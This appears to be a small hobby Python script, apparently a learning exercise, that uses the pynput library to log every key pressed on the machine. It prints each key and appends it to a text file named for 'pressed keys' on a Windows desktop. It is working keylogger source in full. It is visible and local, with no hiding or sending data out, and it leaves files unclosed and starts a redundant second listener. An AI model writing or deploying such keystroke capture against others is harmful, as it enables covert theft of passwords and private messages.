from pynput import keyboard

def keyPressed(key):
    try:
        print("Key pressed: {0}".format(key.char))
        file = open("C:\\Users\\ketop\\OneDrive\\Masaüstü\\basilantuslar.txt", "a", encoding="utf8")
        file.write(key.char +"\n")
    except AttributeError:
        print("Key pressed: {0}".format(key))
        file = open("C:\\Users\\ketop\\OneDrive\\Masaüstü\\basilantuslar.txt", "a", encoding="utf8")
        file.write("\n"+str(key)+"\n")
def keyReleased(key):
    # print("Key released: {0}".format(key.char))
    pass

with keyboard.Listener(on_press=keyPressed, on_release=keyReleased) as listener:
    listener.join()

listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
listener.start()